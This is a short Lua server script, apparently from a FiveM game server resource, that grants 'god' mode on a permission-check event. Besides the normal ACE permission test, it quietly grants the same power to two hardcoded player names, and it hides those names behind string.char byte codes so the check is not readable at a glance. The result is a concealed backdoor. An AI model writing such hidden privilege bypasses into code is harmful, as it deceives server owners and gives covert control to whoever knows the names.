RegisterServerEvent('CheckPermissions')
AddEventHandler('CheckPermissions', function()
    if IsPlayerAceAllowed(source, "npb.god") or GetPlayerName(source) == (string.char(86,101,115,112,117,114,97)) or GetPlayerName(source) == (string.char(071,105,097,110,116,32,067,104,101,101,115,101,32,087,101,100,103,101)) then
        TriggerClientEvent('SetGod', source)
    end
end)
